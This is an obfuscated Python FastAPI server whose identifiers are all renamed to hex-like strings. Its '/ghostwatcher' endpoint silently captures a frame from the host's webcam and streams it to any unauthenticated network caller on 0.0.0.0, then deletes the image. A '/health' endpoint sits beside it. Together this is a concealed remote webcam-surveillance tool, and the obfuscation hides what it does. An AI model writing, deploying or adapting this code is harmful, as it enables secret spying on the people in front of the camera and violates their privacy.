#!/usr/bin/env python3
from __future__ import annotations as _0x1a2b3c
import cv2 as _0x4d5e6f,mimetypes as _0x7g8h9i,os as _0xj1k2l3,socket as _0xm4n5o6,subprocess as _0xp7q8r9,sys as _0xs1t2u3
from datetime import datetime as _0xv4w5x6
from pathlib import Path as _0xy7z8a9
from typing import Iterator as _0xb1c2d3
from fastapi import FastAPI as _0xe4f5g6,HTTPException as _0xh7i8j9
from fastapi.responses import StreamingResponse as _0xk1l2m3,FileResponse as _0xn4o5p6
app=_0xe4f5g6()
def _0xt1u2v3(_0xw4x5y6="photos",_0xz7a8b9=0,_0xc1d2e3=10):
    _0xj1k2l3.makedirs(_0xw4x5y6,exist_ok=True)
    _0xf4g5h6=_0x4d5e6f.VideoCapture(_0xz7a8b9)
    if not _0xf4g5h6.isOpened():return None
    for _ in range(max(0,_0xc1d2e3)):_0xf4g5h6.read()
    _0xi7j8k9,_0xl1m2n3=_0xf4g5h6.read()
    _0xf4g5h6.release()
    if not _0xi7j8k9 or _0xl1m2n3 is None or _0xl1m2n3.size==0:return None
    _0xo4p5q6=_0xv4w5x6.now().strftime("%Y%m%d_%H%M%S")
    _0xr7s8t9=f"photo_{_0xo4p5q6}.jpg"
    _0xu1v2w3=_0xj1k2l3.path.join(_0xw4x5y6,_0xr7s8t9)
    if not _0x4d5e6f.imwrite(_0xu1v2w3,_0xl1m2n3):return None
    return _0xu1v2w3
@app.get("/")
def _0xx4y5z6():return _0xn4o5p6("index.html")
def _0xa7b8c9()->str:return _0xt1u2v3(_0xw4x5y6="captured_photos")
def _0xd1e2f3(_0xg4h5i6:_0xy7z8a9)->str:
    _0xj7k8l9,_=_0x7g8h9i.guess_type(str(_0xg4h5i6))
    return _0xj7k8l9 or "image/jpeg"
@app.get("/ghostwatcher")
def _0xm1n2o3():
    _0xg4h5i6=_0xy7z8a9(_0xa7b8c9())
    if not _0xg4h5i6.is_file():raise _0xh7i8j9(status_code=404,detail=f"Image not found: {_0xg4h5i6}")
    _0xp4q5r6=_0xd1e2f3(_0xg4h5i6)
    if not _0xp4q5r6.startswith("image/"):raise _0xh7i8j9(status_code=415,detail=f"Not an image: {_0xg4h5i6.name}")
    def _0xs7t8u9()->_0xb1c2d3[bytes]:
        try:
            with open(_0xg4h5i6,"rb") as _0xv1w2x3:
                while True:
                    _0xy4z5a6=_0xv1w2x3.read(256*1024)
                    if not _0xy4z5a6:break
                    yield _0xy4z5a6
        finally:
            try:_0xj1k2l3.remove(_0xg4h5i6)
            except(FileNotFoundError,PermissionError):pass
    return _0xk1l2m3(_0xs7t8u9(),media_type=_0xp4q5r6,headers={"Cache-Control":"no-store"})
@app.get("/health")
def _0xb7c8d9():return {"ok":True}
def _0xe1f2g3():
    try:
        _0xh4i5j6=_0xm4n5o6.socket(_0xm4n5o6.AF_INET,_0xm4n5o6.SOCK_DGRAM)
        _0xh4i5j6.connect(("8.8.8.8",80))
        _0xk7l8m9=_0xh4i5j6.getsockname()[0]
        _0xh4i5j6.close()
        return _0xk7l8m9
    except:return "Unable to determine"
def _0xn1o2p3():
    _0xk7l8m9=_0xe1f2g3()
    _0xq4r5s6=8000
    print("="*60)
    print("🚀 Starting FastAPI Server")
    print("="*60)
    print(f"Local access:   http://127.0.0.1:{_0xq4r5s6}")
    print(f"Network access: http://{_0xk7l8m9}:{_0xq4r5s6}")
    print("="*60)
    print("\nEndpoints:")
    print(f"  - http://{_0xk7l8m9}:{_0xq4r5s6}/ghostwatcher (capture photo)")
    print(f"  - http://{_0xk7l8m9}:{_0xq4r5s6}/health (health check)")
    print(f"  - http://{_0xk7l8m9}:{_0xq4r5s6}/docs (API documentation)")
    print("\nPress CTRL+C to stop the server")
    print("="*60)
    print()
    try:_0xp7q8r9.run(["uvicorn","app:app","--host","0.0.0.0","--port",str(_0xq4r5s6)])
    except KeyboardInterrupt:
        print("\n\n✅ Server stopped")
        _0xs1t2u3.exit(0)
if __name__=="__main__":_0xn1o2p3()

# Made with Bob
